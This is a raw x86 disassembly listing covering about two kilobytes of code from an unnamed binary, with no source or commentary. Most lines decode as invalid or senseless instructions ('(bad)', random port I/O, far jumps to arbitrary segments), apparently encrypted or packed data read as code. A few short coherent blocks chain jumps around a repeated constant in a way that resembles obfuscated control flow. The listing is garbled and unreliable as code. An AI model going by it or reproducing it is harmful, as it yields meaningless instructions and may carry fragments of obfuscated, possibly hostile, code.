  41433f:	out    0x9d,eax
  414341:	pop    eax
  414342:	clc    
  414343:	and    DWORD PTR [ebp+esi*8+0x6c],0xffffffad
  414348:	mov    eax,0x46bf9659
  41434d:	or     ecx,DWORD PTR [ebp-0x79e0d16f]
  414353:	ret    
  414354:	xor    eax,0x6c8c4340
  414359:	sbb    ah,BYTE PTR [edi-0x264cc1b5]
  41435f:	push   edx
  414360:	imul   ebx,DWORD PTR [esi],0x14
  414363:	jae    0x4143ab
  414365:	je     0x4142f6
  414367:	inc    ecx
  414368:	mov    esp,0x966b811b
  41436d:	adc    BYTE PTR [eax+0x6cff41f7],ah
  414373:	jp     0x4143ae
  414375:	arpl   WORD PTR [edx-0x19],si
  414378:	inc    di
  41437a:	xchg   BYTE PTR [edx-0x6],bl
  41437d:	ins    BYTE PTR es:[edi],dx
  41437e:	cld    
  41437f:	or     cl,BYTE PTR [esi+ebx*8]
  414382:	xor    esp,DWORD PTR [esi]
  414384:	mov    ah,BYTE PTR [edi-0x42b77bd]
  41438a:	sar    DWORD PTR [ecx-0x7c8613f2],1
  414390:	jae    0x4143e3
  414392:	aad    0x7e
  414394:	ss retf 0x1498
  414398:	mov    ds:0x663bfe22,eax
  41439d:	adc    edi,DWORD PTR [ecx]
  41439f:	loopne 0x4143a5
  4143a1:	mov    edx,0x1b7bc2bb
  4143a6:	push   esp
  4143a7:	xchg   BYTE PTR [eax],bl
  4143a9:	ins    DWORD PTR es:[edi],dx
  4143aa:	push   ecx
  4143ab:	adc    eax,0x46eecd1f
  4143b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143b1:	mov    eax,DWORD PTR [edi]
  4143b3:	mov    edx,DWORD PTR [edi]
  4143b5:	aas    
  4143b6:	test   esi,eax
  4143b8:	sub    edx,ecx
  4143ba:	lea    edi,[edi+ebx*1+0x327298]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	into   
  4143e5:	pop    edi
  4143e6:	xor    edx,DWORD PTR [ecx+eax*8+0x9]
  4143ea:	jg     0x414464
  4143ec:	in     eax,0x7e
  4143ee:	js     0x414468
  4143f0:	adc    eax,DWORD PTR [edx+0x23a8cb29]
  4143f6:	xor    cl,ch
  4143f8:	jp     0x414472
  4143fa:	or     dl,ah
  4143fc:	js     0x414412
  4143fe:	xor    eax,DWORD PTR [ecx]
  414400:	out    0xaa,eax
  414402:	xor    BYTE PTR [eax],bl
  414404:	xor    eax,0x29c3a1b1
  414409:	enter  0x5fbf,0x38
  41440d:	and    edx,esp
  41440f:	loopne 0x4143d3
  414411:	xchg   edi,eax
  414412:	mov    ebx,0xc38f42ee
  414417:	int3   
  414418:	pop    edx
  414419:	jl     0x414463
  41441b:	mov    bh,0xe6
  41441d:	sub    BYTE PTR [edx-0x46dc8d7a],cl
  414423:	out    0xcc,eax
  414425:	pop    es
  414426:	pop    ecx
  414427:	out    0xa4,eax
  414429:	xor    ebp,DWORD PTR [esi-0x21]
  41442c:	sub    DWORD PTR [ecx-0x55dfe083],0xe39034ea
  414436:	aam    0xf7
  414438:	dec    ecx
  414439:	mov    ebp,0x14c26f22
  41443e:	popf   
  41443f:	enter  0x700,0xc3
  414443:	or     al,0x14
  414445:	mov    BYTE PTR [edx-0x39],bl
  414448:	adc    DWORD PTR [esi+ecx*2-0x1e],ecx
  41444c:	inc    ecx
  41444d:	adc    eax,0x80275092
  414452:	add    al,cl
  414454:	xlat   BYTE PTR ds:[ebx]
  414455:	jle    0xb7c3d725
  41445b:	test   eax,0x1e67d6c2
  414460:	xchg   DWORD PTR [edi-0x7b],edi
  414463:	arpl   ax,sp
  414465:	sub    al,0xd6
  414467:	outs   dx,BYTE PTR ds:[esi]
  414468:	or     eax,0xae29ba4
  41446d:	push   edx
  41446e:	add    dh,BYTE PTR [edx+0x4ecde693]
  414474:	mov    esi,0x4d8e6a4b
  414479:	jmp    0xa0bd6284
  41447e:	jl     0x41446c
  414480:	gs xchg esi,eax
  414482:	jns    0x41440b
  414484:	add    esp,DWORD PTR [ecx]
  414486:	inc    ecx
  414487:	fdivr  QWORD PTR [esi+0x10]
  41448a:	cmp    eax,0x906372d4
  41448f:	adc    al,0xa9
  414491:	mov    DWORD PTR [ecx+edi*8],esp
  414494:	aaa    
  414495:	sbb    al,0x52
  414497:	jb     0x414469
  414499:	sbb    esi,DWORD PTR [edi+ebp*8-0x74]
  41449d:	push   esp
  41449e:	test   al,0x9a
  4144a0:	xchg   edx,eax
  4144a1:	gs jno 0x414505
  4144a4:	xlat   BYTE PTR ds:[ebx]
  4144a5:	stos   BYTE PTR es:[edi],al
  4144a6:	(bad)  
  4144a7:	icebp  
  4144a8:	es (bad) 
  4144aa:	ftst   
  4144ac:	dec    esi
  4144ad:	sbb    edx,DWORD PTR [edx+0x62]
  4144b0:	(bad)  
  4144b1:	and    al,BYTE PTR [ebx+edi*1-0x1e]
  4144b5:	pop    ds
  4144b6:	inc    esi
  4144b7:	nop
  4144b8:	add    DWORD PTR [ebx+0x4f],esi
  4144bb:	stos   BYTE PTR es:[edi],al
  4144bc:	div    DWORD PTR [esi-0x2b]
  4144bf:	hlt    
  4144c0:	shr    BYTE PTR [ebp-0x76e8545b],0xa5
  4144c7:	cli    
  4144c8:	mov    eax,0xb3bb3853
  4144cd:	mov    gs,WORD PTR [ebx]
  4144cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144d0:	out    dx,al
  4144d1:	stos   DWORD PTR es:[edi],eax
  4144d2:	xor    eax,0xce7bb7c8
  4144d7:	ret    0x470
  4144da:	rcl    BYTE PTR [esi],cl
  4144dc:	and    al,0x1f
  4144de:	add    eax,0x72bfe81f
  4144e3:	sahf   
  4144e4:	and    eax,DWORD PTR [esi]
  4144e6:	nop
  4144e7:	aas    
  4144e8:	jmp    0x39b6:0xd4442bd
  4144ef:	jb     0x414473
  4144f1:	xor    BYTE PTR [ecx+0x69],bl
  4144f4:	stos   BYTE PTR es:[edi],al
  4144f5:	pop    es
  4144f6:	mov    dh,ah
  4144f8:	outs   dx,DWORD PTR ds:[esi]
  4144f9:	int3   
  4144fa:	mov    ebp,ebx
  4144fc:	mov    eax,ds:0xebfc3e62
  414501:	jb     0x4144a9
  414503:	ror    ch,0x2c
  414506:	xchg   ebp,eax
  414507:	ficomp WORD PTR [ebx+eiz*8-0x5a]
  41450b:	adc    eax,0xe84f6925
  414510:	push   esi
  414511:	and    al,ch
  414513:	and    eax,eax
  414515:	(bad)  
  414516:	jle    0x41451b
  414518:	mov    ecx,ebp
  41451a:	int3   
  41451b:	mov    edx,eax
  41451d:	xor    ebp,ebx
  41451f:	push   es
  414520:	in     eax,0xb
  414522:	pop    ebp
  414523:	pop    eax
  414524:	neg    BYTE PTR [edx+ecx*8+0x1]
  414528:	pop    ds
  414529:	xlat   BYTE PTR ds:[ebx]
  41452a:	test   al,0xc2
  41452c:	jmp    0xddcdccc8
  414531:	xchg   DWORD PTR [edx],ebp
  414533:	cs cli 
  414535:	cmc    
  414536:	push   0x26
  414538:	stos   BYTE PTR es:[edi],al
  414539:	mov    ds:0x56c9f175,eax
  41453e:	jmp    0x9e6a5978
  414543:	dec    ebp
  414544:	cmp    eax,0x3122ee56
  414549:	or     DWORD PTR [ebp+edx*1+0x50],ebp
  41454d:	(bad)  
  41454e:	cli    
  41454f:	mov    ebp,0x122b6f8f
  414554:	das    
  414555:	adc    al,0xdd
  414557:	xor    bl,BYTE PTR [eax]
  414559:	inc    ebp
  41455a:	addr16 inc ecx
  41455c:	and    ah,BYTE PTR ss:[edi]
  41455f:	push   eax
  414560:	iret   
  414561:	sbb    esp,eax
  414563:	ret    0xcfaa
  414566:	(bad)  
  414567:	fbld   TBYTE PTR [eax+eiz*2+0x51abd4c3]
  41456e:	repnz push ebp
  414570:	xor    ebp,edx
  414572:	(bad)  
  414573:	sti    
  414574:	sar    edx,0x2d
  414577:	jnp    0x4145e4
  414579:	push   edi
  41457a:	ret    
  41457b:	ret    
  41457c:	call   0x83295ef5
  414581:	mov    bl,0x20
  414583:	std    
  414584:	adc    eax,DWORD PTR ds:0x14bc39dd
  41458a:	mov    eax,0xa1cbdaae
  41458f:	xor    eax,0x1333c939
  414594:	imul   ecx,eax,0xd38435fd
  41459a:	lock mov WORD PTR [eax-0x7feca31e],cs
  4145a1:	or     eax,0xd4049f63
  4145a6:	pusha  
  4145a7:	push   eax
  4145a8:	(bad)  
  4145a9:	fst    DWORD PTR [ebp-0x61]
  4145ac:	test   eax,0x56cd9227
  4145b1:	js     0x4145bb
  4145b3:	call   0x85ba1865
  4145b8:	push   edx
  4145b9:	adc    esp,ecx
  4145bb:	inc    ebp
  4145bc:	pop    es
  4145bd:	loope  0x414612
  4145bf:	xchg   esp,esi
  4145c1:	scas   al,BYTE PTR es:[edi]
  4145c2:	scas   eax,DWORD PTR es:[edi]
  4145c3:	xchg   ebx,eax
  4145c4:	lea    edi,[esi+ecx*1-0x72741f16]
  4145cb:	add    eax,0x61ceff8e
  4145d0:	mov    bl,0x6a
  4145d2:	mov    ebx,0x951d0168
  4145d7:	lods   al,BYTE PTR ds:[esi]
  4145d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145d9:	jo     0x4145e1
  4145db:	sbb    ebx,DWORD PTR [esi]
  4145dd:	dec    eax
  4145de:	push   es
  4145df:	repz sub ah,ch
  4145e2:	out    0xa,eax
  4145e4:	mov    dl,0x6b
  4145e6:	mov    ds:0x484e5eb7,eax
  4145eb:	pop    ebp
  4145ec:	sahf   
  4145ed:	cmp    esi,DWORD PTR [ecx]
  4145ef:	ret    0xbb3a
  4145f2:	icebp  
  4145f3:	mov    al,0xf4
  4145f5:	outs   dx,BYTE PTR ds:[esi]
  4145f6:	push   esp
  4145f7:	sub    al,0x84
  4145f9:	fwait
  4145fa:	test   al,0xa7
  4145fc:	mov    ecx,DWORD PTR [edi+0x4af3a412]
  414602:	pop    ebx
  414603:	retf   0x990a
  414606:	jns    0x4145e1
  414608:	jno    0x41459d
  41460a:	sub    BYTE PTR [ebp-0x17],cl
  41460d:	sub    DWORD PTR [eax+0x42],edi
  414610:	mov    edi,0xda16266e
  414615:	out    0x69,al
  414617:	(bad)  
  414618:	fdivr  st,st(5)
  41461a:	ins    BYTE PTR es:[edi],dx
  41461b:	std    
  41461c:	out    dx,al
  41461d:	push   edi
  41461e:	xor    edx,DWORD PTR ds:0x1d3d1b2c
  414624:	inc    ecx
  414625:	ds xor esi,esi
  414628:	push   0x47
  41462a:	rcr    BYTE PTR [edx-0x5621d203],1
  414630:	cli    
  414631:	(bad)  
  414632:	ja     0x4145c2
  414634:	sub    cl,BYTE PTR [edx+edx*4-0x58]
  414638:	mov    edi,0x7cd6e0e8
  41463d:	push   es
  41463e:	popw   ds
  414640:	cmp    esp,edx
  414642:	sbb    eax,edi
  414644:	stc    
  414645:	adc    bl,BYTE PTR [ebp-0x10]
  414648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414649:	fdivr  QWORD PTR [edi]
  41464b:	push   ds
  41464c:	lea    ecx,[eax]
  41464e:	rol    BYTE PTR [eax+ebx*4],1
  414651:	mov    dh,0x1a
  414653:	dec    eax
  414654:	mov    dh,bh
  414656:	mov    bh,0x11
  414658:	push   esp
  414659:	jmp    0xd7f055d8
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	sbb    BYTE PTR [edi+0x7d],0x83
  414675:	imul   BYTE PTR [esi-0x1a8780f1]
  41467b:	jle    0x4146f5
  41467d:	js     0x414600
  41467f:	xor    al,0xef
  414681:	iret   
  414682:	cmp    DWORD PTR [eax],esi
  414684:	push   0x32664a5c
  414689:	inc    esi
  41468a:	inc    esi
  41468b:	and    ecx,DWORD PTR [eax]
  41468d:	cdq    
  41468e:	outs   dx,DWORD PTR ds:[esi]
  41468f:	loopne 0x414687
  414691:	stos   DWORD PTR es:[edi],eax
  414692:	dec    ebp
  414693:	mov    al,0x78
  414695:	ins    DWORD PTR es:[edi],dx
  414696:	push   ebp
  414697:	jg     0x414711
  414699:	pop    ebp
  41469a:	(bad)  
  41469b:	mov    bh,0x50
  41469d:	inc    ebx
  41469e:	jmp    0xbcee:0xec4eec74
  4146a5:	fwait
  4146a6:	hlt    
  4146a7:	jge    0x414694
  4146a9:	gs jg  0x4146a8
  4146ac:	sub    eax,0xe3a41db3
  4146b1:	popf   
  4146b2:	test   cl,0x99
  4146b5:	push   eax
  4146b6:	shl    DWORD PTR [esp+ebx*1],cl
  4146b9:	scas   al,BYTE PTR es:[edi]
  4146ba:	sbb    ebp,DWORD PTR [ebx+0x2a]
  4146bd:	mov    al,0x42
  4146bf:	test   BYTE PTR [ebx-0x61],dh
  4146c2:	ror    eax,0x69
  4146c5:	sahf   
  4146c6:	fdivp  st(4),st
  4146c8:	xchg   ecx,eax
  4146c9:	std    
  4146ca:	test   DWORD PTR [edx],0xa5cd909f
  4146d0:	fstp   DWORD PTR fs:[eax]
  4146d3:	lods   al,BYTE PTR ds:[esi]
  4146d4:	pop    ebp
  4146d5:	cmc    
  4146d6:	retf   0x290e
  4146d9:	mov    al,ds:0x4a60b3e0
  4146de:	xor    dl,BYTE PTR [esi-0x19]
  4146e1:	sub    eax,0xf4e1320b
  4146e6:	ds dec eax
  4146e8:	cmp    al,0xcf
  4146ea:	test   BYTE PTR [edx-0x114fd471],ch
  4146f0:	ins    DWORD PTR es:[edi],dx
  4146f1:	pop    ebx
  4146f2:	and    al,0x2e
  4146f4:	scas   eax,DWORD PTR es:[edi]
  4146f5:	outs   dx,DWORD PTR ds:[esi]
  4146f6:	dec    edi
  4146f7:	and    dl,BYTE PTR [edi-0x6c]
  4146fa:	adc    BYTE PTR [edi+0x26312188],cl
  414700:	and    eax,0x22288f11
  414705:	sbb    al,0xee
  414707:	call   0x91d3:0xdbb73106
  41470e:	fsub   DWORD PTR [ebx+0x3aa17165]
  414714:	rsm    
  414716:	sub    al,0x4a
  414718:	mov    eax,ds:0xc0badbf3
  41471d:	add    eax,0xc52089ed
  414722:	mov    ch,0x61
  414724:	cli    
  414725:	jno    0x4146fc
  414727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414728:	and    eax,0x11d448c5
  41472d:	push   edx
  41472e:	(bad)  
  41472f:	mov    al,0xc9
  414731:	stc    
  414732:	adc    bl,ah
  414734:	(bad)  
  414735:	or     bl,BYTE PTR [ecx+0x6a]
  414738:	lods   al,BYTE PTR ds:[esi]
  414739:	stos   BYTE PTR es:[edi],al
  41473a:	(bad)  
  41473b:	mov    ah,0xdc
  41473d:	rol    DWORD PTR [ebx+0x553b9edb],1
  414743:	fdiv   QWORD PTR [ebx]
  414745:	xchg   ebx,eax
  414746:	retf   0xbbf7
  414749:	aaa    
  41474a:	lds    ebp,FWORD PTR [eax-0xe]
  41474d:	sub    eax,0x768d3bbf
  414752:	dec    ebx
  414753:	arpl   WORD PTR ss:[eax+ebx*4-0x5a87969],di
  41475b:	clc    
  41475c:	gs jb  0x4147bb
  41475f:	repz push cs
  414761:	(bad)
  414764:	pop    es
  414765:	adc    DWORD PTR [ebp+0x4ec74b56],ecx
  41476b:	sub    eax,0x950fc4c5
  414770:	or     al,0xfd
  414772:	neg    DWORD PTR [ebp+0x18255d3]
  414778:	or     BYTE PTR [bx+0x1ff9],cl
  41477d:	mov    ecx,0xeefc655f
  414782:	push   ecx
  414783:	adc    ebp,DWORD PTR [edi]
  414785:	adc    bh,BYTE PTR [ebx]
  414787:	in     al,dx
  414788:	dec    edi
  414789:	xlat   BYTE PTR ds:[ebx]
  41478a:	dec    ebp
  41478b:	mov    bl,0x73
  41478d:	and    ch,BYTE PTR [ebx+0x62e76ba1]
  414793:	xor    DWORD PTR [edi-0x4b],0x3e
  414797:	mov    DWORD PTR [ebp+0xc],ecx
  41479a:	and    DWORD PTR [edx-0x28],0xffffffcd
  41479e:	jg     0x414768
  4147a0:	mov    ebp,0x47ab808b
  4147a5:	out    0x1,al
  4147a7:	mov    eax,ds:0x61ec69af
  4147ac:	mov    bl,0x23
  4147ae:	sar    BYTE PTR [ecx+0x6178a470],0xf
  4147b5:	mov    ds:0xf2d3d088,eax
  4147ba:	fadd   QWORD PTR [esi+0x24]
  4147bd:	(bad)  
  4147bf:	les    ebx,FWORD PTR [esi+0xa0957fe]
  4147c5:	(bad)  
  4147c6:	mov    ds:0x9e6a28f,al
  4147cb:	out    dx,al
  4147cc:	nop
  4147cd:	add    bh,ah
  4147cf:	fadd   QWORD PTR [esi+0x13d82415]
  4147d5:	mov    gs,ecx
  4147d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d8:	int3   
  4147d9:	inc    esp
  4147da:	ret    0xc333
  4147dd:	sub    eax,0x7fb53956
  4147e2:	xor    eax,0xd9bc6302
  4147e7:	mov    dl,0xd
  4147e9:	add    eax,0xa2472988
  4147ee:	fwait
  4147ef:	ins    DWORD PTR es:[edi],dx
  4147f0:	cld    
  4147f1:	in     eax,dx
  4147f2:	js     0x4147ec
  4147f4:	lahf   
  4147f5:	inc    esi
  4147f6:	mov    bp,0x53f0
  4147fa:	or     al,0xc6
  4147fc:	sub    al,0xcd
  4147fe:	xor    al,0xd2
  414801:	fisttp WORD PTR [ecx]
  414803:	cld    
  414804:	cld    
  414805:	mov    ds:0x671a5caa,eax
  41480a:	lods   al,BYTE PTR ds:[esi]
  41480b:	lea    ecx,[edx]
  41480d:	push   cs
  41480e:	cmc    
  41480f:	mov    edi,0xf6c1ff55
  414814:	xchg   esp,eax
  414815:	sbb    esi,0x45396280
  41481b:	sbb    eax,0x948f8666
  414820:	out    0x23,al
  414822:	and    cl,dl
  414824:	adc    BYTE PTR [ecx],0x3c
  414827:	adc    eax,0xc50918ce
  41482c:	xlat   BYTE PTR ds:[ebx]
  41482d:	xor    al,0x39
  41482f:	xor    al,0x21
  414831:	adc    dl,cl
  414833:	mov    al,0xce
  414835:	jp     0x414842
  414837:	jmp    0x771f:0xf2cd95b4
  41483e:	add    ebx,DWORD PTR [ebp-0x3f]
  414841:	aad    0x1d
  414843:	cmp    eax,0x3df962dd
  414848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414849:	shl    BYTE PTR [eax+0x4f],1
  41484c:	push   edx
  41484d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41484e:	add    al,0xa9
  414850:	popa   
  414851:	inc    edi
  414852:	mov    gs,WORD PTR [ecx+0x590d1fe1]
  414858:	loop   0x41480d
  41485a:	lock adc ah,ch
  41485d:	outs   dx,BYTE PTR ds:[esi]
  41485e:	and    ebx,eax
  414860:	sbb    esp,eax
  414862:	or     eax,0x646eeb35
  414867:	sub    BYTE PTR [esi+0x18f9c9fd],bl
  41486d:	xor    BYTE PTR [ebx+0x31],dh
  414870:	inc    edx
  414871:	ret    0x6f42
  414874:	ins    DWORD PTR es:[edi],dx
  414875:	hlt    
  414876:	cld    
  414877:	mov    WORD PTR [esi+0x604cd883],es
  41487d:	push   esi
  41487e:	jne    0x4148ed
  414880:	mov    edx,0x787a3850
  414885:	cmc    
  414886:	out    dx,al
  414887:	cmova  esp,DWORD PTR [ebx]
  41488a:	fistp  WORD PTR [ecx]
  41488c:	enter  0x4980,0xe
  414890:	mov    al,ds:0x792a841f
  414895:	repz jl 0x41485d
  414898:	pushf  
  414899:	mov    eax,0x2f60ba39
  41489e:	loope  0x4148c9
  4148a0:	or     DWORD PTR [edx+0xe],esi
  4148a3:	in     al,dx
  4148a4:	neg    DWORD PTR ds:0x61d8899e
  4148aa:	fwait
  4148ab:	xor    DWORD PTR [edi+0x176d92ff],edi
  4148b1:	lahf   
  4148b2:	(bad)  
  4148b3:	aad    0x42
  4148b5:	repnz pusha 
  4148b7:	ds fwait
  4148b9:	inc    edx
  4148ba:	ret    0xef49
  4148bd:	bound  eax,QWORD PTR [ecx+ebp*2+0x48]
  4148c1:	dec    esp
  4148c2:	retf   
  4148c3:	sbb    al,0xac
  4148c5:	ret    0x4f56
  4148c8:	stos   BYTE PTR es:[edi],al
  4148c9:	out    0xa1,eax
  4148cb:	imul   esi,DWORD PTR [ecx],0xd769d068
  4148d1:	mov    esp,0xcf2bc6a5
  4148d6:	aas    
  4148d7:	pop    es
  4148d8:	or     DWORD PTR [ecx],ebp
  4148da:	cwde   
  4148db:	mov    ecx,0x8affbad2
  4148e0:	and    DWORD PTR [eax],ebx
  4148e2:	inc    eax
  4148e3:	data16 cmp al,0x80
  4148e6:	sahf   
  4148e7:	xor    edi,DWORD PTR [edi]
  4148e9:	xor    edi,eax
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0xd27854b]
  414921:	xchg   bp,ax
  414923:	sbb    BYTE PTR [ebx],0xc
  414926:	jg     0x4149a0
  414928:	in     eax,0x7e
  41492a:	js     0x4149a4
  41492c:	xchg   ch,cl
  41492e:	add    BYTE PTR [ebp-0x56bddb20],ch
  414934:	bound  ebx,QWORD PTR [esi+0x1b312f24]
  41493a:	sub    al,dh
  41493c:	xchg   edi,eax
  41493d:	fistp  WORD PTR [esi+eax*1-0x5c]
  414941:	call   0x5d519c0b
  414946:	std    
  414947:	inc    edi
  414948:	lds    ecx,FWORD PTR es:[ebx]
  41494b:	inc    eax
  41494c:	sbb    al,0xaa
  41494e:	or     DWORD PTR [esp+eiz*2-0x6b],0xb011f2dc
  414956:	ret    0x14d1
  414959:	jge    0x4149a0
  41495b:	push   0xd64b2254
  414960:	jcxz   0x414947
  414963:	int3   
  414964:	lods   al,BYTE PTR ds:[esi]
  414965:	mov    bl,0x9a
  414967:	fs mov bh,0xbb
  41496a:	mov    DWORD PTR [esp+eiz*2-0x1c52b08a],edx
  414971:	add    DWORD PTR [eax+0x679611fb],edi
  414977:	repnz dec esp
  414979:	cdq    
  41497a:	xor    edx,DWORD PTR [ebp+edi*8-0xe]
  41497e:	xchg   al,ch
  414980:	lds    edx,FWORD PTR [esp+edi*1+0x22]
  414984:	pop    es
  414985:	je     0x41495a
  414987:	popa   
  414988:	add    bh,BYTE PTR [eax]
  41498a:	jns    0x414986
  41498c:	mov    bh,ah
  41498e:	dec    ebx
  41498f:	jnp    0x414989
  414991:	mov    ch,0xb2
  414993:	cmp    DWORD PTR [esi+0x284958b1],0xffffff98
  41499a:	xlat   BYTE PTR ds:[ebx]
  41499b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41499c:	and    al,0x37
  41499e:	aas    
  41499f:	sub    BYTE PTR [esi],bl
  4149a1:	jle    0x4149c5
  4149a3:	iret   
  4149a4:	lahf   
  4149a5:	sbb    edx,0x6dd11287
  4149ab:	xchg   BYTE PTR [esi-0x9aa9074],cl
  4149b1:	mov    eax,ds:0xe9fe5cd3
  4149b6:	dec    esi
  4149b7:	arpl   dx,bp
  4149b9:	push   ds
  4149ba:	sbb    al,0x3
  4149bc:	jns    0x414941
  4149be:	inc    esp
  4149bf:	and    esp,DWORD PTR [edi-0x5c]
  4149c2:	push   ebx
  4149c3:	mov    BYTE PTR [ebx+0x59e851c6],ah
  4149c9:	mov    eax,eax
  4149cb:	bswap  ebp
  4149cd:	imul   esi,DWORD PTR [esi+0x4da687f6],0x59
  4149d4:	inc    esi
  4149d5:	inc    edx
  4149d6:	or     DWORD PTR [esi+0x1],eax
  4149d9:	test   al,0x45
  4149db:	iret   
  4149dc:	ss add eax,0x4b9d79cf
  4149e2:	jns    0x414a29
  4149e4:	sub    BYTE PTR [esi+0x13],al
  4149e7:	icebp  
  4149e8:	mov    bl,0xdf
  4149ea:	std    
  4149eb:	pop    edi
  4149ec:	(bad)  
  4149ed:	fistp  QWORD PTR [ebx-0x6d2c31b1]
  4149f3:	imul   esp,DWORD PTR [esi+ecx*4+0x27],0x88b5cb0f
  4149fb:	push   ebx
  4149fc:	add    BYTE PTR [ecx+0x5ce9e128],dl
  414a02:	and    BYTE PTR [edi-0x2f62c59d],ah
  414a08:	mov    bl,0x1d
  414a0a:	inc    esp
  414a0b:	sbb    ch,dh
  414a0d:	icebp  
  414a0e:	leave  
  414a0f:	aas    
  414a10:	xchg   esi,eax
  414a11:	dec    ebx
  414a12:	popa   
  414a13:	clc    
  414a14:	xor    edi,ecx
  414a16:	fistp  WORD PTR [edi]
  414a18:	xchg   edi,eax
  414a19:	lock jecxz 0x4149e6
  414a1c:	in     al,dx
  414a1d:	int    0x3a
  414a1f:	fldenv [ecx+0x6f]
  414a22:	dec    esp
  414a23:	jl     0x414a51
  414a25:	ret    0x2bb6
  414a28:	hlt    
  414a29:	jmp    0x6cef887a
  414a2e:	add    BYTE PTR [esi+0x44],cl
  414a31:	xchg   DWORD PTR [esp+esi*8],eax
  414a34:	xor    eax,0x688fe26d
  414a39:	ja     0x4149e6
  414a3b:	lds    ebx,FWORD PTR [edx-0x6e3167d2]
  414a41:	stc    
  414a42:	lods   al,BYTE PTR ds:[esi]
  414a43:	cmp    ecx,0x349cc5e8
  414a49:	jnp    0x414ac7
  414a4b:	sbb    DWORD PTR [edx+0x5515371f],edx
  414a51:	cmp    ebx,DWORD PTR [ecx-0x14]
  414a54:	mov    bh,0x43
  414a56:	cdq    
  414a57:	mov    cl,0x8d
  414a59:	cmp    ebx,esp
  414a5b:	test   BYTE PTR [ecx+eax*1-0x27],ah
  414a5f:	pusha  
  414a60:	in     eax,0xf8
  414a62:	or     eax,0xe92c5c86
  414a67:	cmc    
  414a68:	repnz sub DWORD PTR [esi-0x10],0xffffffa5
  414a6d:	sbb    al,0xf6
  414a6f:	shl    BYTE PTR [ebp-0x24],1
  414a72:	fldcw  WORD PTR [esi-0x702786ba]
  414a78:	ret    0xcc0e
  414a7b:	jp     0x414acf
  414a7d:	mov    ah,0xcc
  414a7f:	sub    ch,ah
  414a81:	jbe    0x414a7e
  414a83:	outs   dx,DWORD PTR ds:[esi]
  414a84:	enter  0xf5c6,0x31
  414a88:	repz mov eax,ds:0x9e5a2732
  414a8e:	out    0x98,eax
  414a90:	sub    al,0x23
  414a92:	jmp    0x9752:0xdb6d9f9f
  414a99:	mov    BYTE PTR [ebx+0x4ce7a152],ch
  414a9f:	(bad)  
  414aa0:	imul   ebx,DWORD PTR [eax+0x374e82f0],0x6f6ae2da
  414aaa:	stos   DWORD PTR es:[edi],eax
  414aab:	mov    ch,0x5e
  414aad:	std    
  414aae:	aam    0xbd
  414ab0:	xchg   ecx,eax
  414ab1:	pop    ds
  414ab2:	cdq    
  414ab3:	mov    al,0x12
  414ab5:	mov    ah,0xbc
  414ab7:	sub    BYTE PTR [esi+esi*8],al
  414aba:	push   ds
  414abb:	mov    esp,edx
  414abd:	dec    ecx
  414abe:	dec    ebx
  414abf:	gs xchg esp,eax
  414ac1:	add    eax,0xa9bb6056
  414ac6:	sar    BYTE PTR [edi+0x74],0x95
  414aca:	lahf   
  414acb:	push   edx
  414acc:	xchg   edx,eax
  414acd:	and    ebx,esp
  414acf:	int    0x8a
  414ad1:	push   esi
  414ad2:	fsubr  DWORD PTR [edi+ecx*1]
  414ad5:	stc    
  414ad6:	jecxz  0x414abd
  414ad8:	jl     0x414af0
  414ada:	dec    ecx
  414adb:	(bad)  
  414adc:	cmc    
  414add:	push   0x4d0222d2
  414ae2:	rol    BYTE PTR [eax+edx*4+0x4d],1
  414ae6:	shr    BYTE PTR [esi-0x17],1
  414ae9:	aad    0x3c
  414aeb:	call   0x7919cebc
  414af0:	gs out 0x7e,eax
  414af3:	adc    eax,0x6786a01f
  414af8:	rcr    DWORD PTR [edi],0x24
  414afb:	fmul   QWORD PTR [edi-0x2e]
  414afe:	dec    esp
  414aff:	add    eax,0x466059d7
  414b04:	cmp    bl,bh
  414b06:	imul   ebp,DWORD PTR [ebp-0x1d],0xf68bcf56
  414b0d:	test   al,0xca
  414b0f:	adc    eax,0x8c44d42b
  414b14:	xor    DWORD PTR [edx+esi*4+0x2dd91369],ebp
  414b1b:	std    
  414b1c:	(bad)  
  414b1d:	rcr    DWORD PTR fs:[esi],0x9
  414b21:	lods   eax,DWORD PTR ds:[esi]
  414b22:	loope  0x414ad9
  414b24:	(bad)  
  414b26:	mov    ah,BYTE PTR [edi+esi*8]
  414b29:	mov    al,ds:0xd116e370
  414b2e:	push   0x50
  414b30:	inc    ecx
  414b31:	jle    0x414b50
  414b33:	dec    edi
  414b34:	outs   dx,BYTE PTR ds:[esi]
  414b35:	test   eax,0x2e34ea15
  414b3a:	pop    ecx
  414b3b:	out    dx,eax
  414b3c:	jmp    0xa44:0x17d7cde7
  414b43:	xchg   esi,eax
  414b44:	fs popa 
  414b46:	dec    ebx
